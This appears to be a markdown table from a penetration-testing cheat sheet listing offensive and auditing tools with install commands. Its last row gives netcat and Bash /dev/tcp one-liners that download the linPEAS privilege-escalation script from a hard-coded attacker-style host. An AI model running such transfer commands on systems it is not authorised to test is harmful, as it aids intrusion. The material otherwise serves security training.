## 🌐 Web & 🖥️ Machine

| Tool | Description | Install / URL |
|------|-------------|--------------------|
| [Burp Suite](https://portswigger.net/burp) | Web proxy | [Community Edition](https://portswigger.net/burp/communitydownload) |
| [sqlmap](https://sqlmap.org/) | SQLi automation | `sudo apt install sqlmap` |
| [ffuf](https://github.com/ffuf/ffuf) | Fuzz URL/files | `go install github.com/ffuf/ffuf@latest` |
| [dirsearch](https://github.com/maurosoria/dirsearch) | Web dir brute-forcer | `git clone` + `pip install -r requirements.txt` |
| [httpx](https://github.com/projectdiscovery/httpx) | Web probing tool | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |
| [nuclei](https://github.com/projectdiscovery/nuclei) | Vulnerability scanner with templates | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| [XSStrike](https://github.com/s0md3v/XSStrike) | XSS scanner | `git clone` + `pip install -r requirements.txt` |
| [Postman](https://www.postman.com/) | API testing | Download |
| [Cookie-Editor](https://github.com/Moustachauve/cookie-editor) | Cookie manager | Browser extension |
| [nmap](https://nmap.org/) | Network scanner | `sudo apt install nmap` |
| [netcat (nc)](https://man7.org/linux/man-pages/man1/nc.1.html) | Network debugger | `sudo apt install netcat` |
| [socat](http://www.dest-unreach.org/socat/) | Data relay tool | `sudo apt install socat` |
| [linPEAS](https://github.com/carlospolop/PEASS-ng) | Linux privesc audit | `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh` |
| [winPEAS](https://github.com/carlospolop/PEASS-ng) | Windows privesc audit | GitHub release |
| [pwncat](https://github.com/cytopia/pwncat) | Post-exploitation tool | `pip install pwncat` |
| [chisel](https://github.com/jpillora/chisel) | TCP tunnel over HTTP | Precompiled binary |
| [sshuttle](https://github.com/sshuttle/sshuttle) | VPN over SSH | `pip install sshuttle` |
| [Metasploit Framework](https://metasploit.com/) | Exploitation framework | `sudo apt install metasploit-framework` |
| [subfinder](https://github.com/projectdiscovery/subfinder) | Subdomain enumeration | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| [amass](https://github.com/owasp-amass/amass) | Attack surface mapping | `sudo apt install amass` |
| [gobuster](https://github.com/OJ/gobuster) | Directory/DNS brute-forcer | `go install github.com/OJ/gobuster/v3@latest` |
| [wfuzz](https://github.com/xmendez/wfuzz) | Web fuzzer | `sudo apt install wfuzz` |
| [hydra](https://github.com/vanhauser-thc/thc-hydra) | Login brute-forcer | `sudo apt install hydra` |
| [john (John the Ripper)](https://www.openwall.com/john/) | Password cracker | `sudo apt install john` |
| [hashcat](https://hashcat.net/hashcat/) | GPU password cracker | `sudo apt install hashcat` |
| [Responder](https://github.com/lgandx/Responder) | LLMNR/NBT-NS poisoner | `git clone` |
| [linPEAS](https://github.com/carlospolop/PEASS-ng) | Linux privesc audit | `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh` <br>**Alternative (raw TCP / HTTP over netcat):** ``printf 'GET /test HTTP/1.1\r\nHost: 10.10.16.22:5555\r\nConnection: close\r\n\r\n' | nc 10.10.16.22 5555 > linpeas.sh`` <br>**Alternative (Bash /dev/tcp):** ``( exec 3<>/dev/tcp/10.10.16.22/5555; printf 'GET /test HTTP/1.1\r\nHost: 10.10.16.22:5555\r\nConnection: close\r\n\r\n' >&3; cat <&3; exec 3<&-; exec 3>&- ) > linpeas.sh`` |
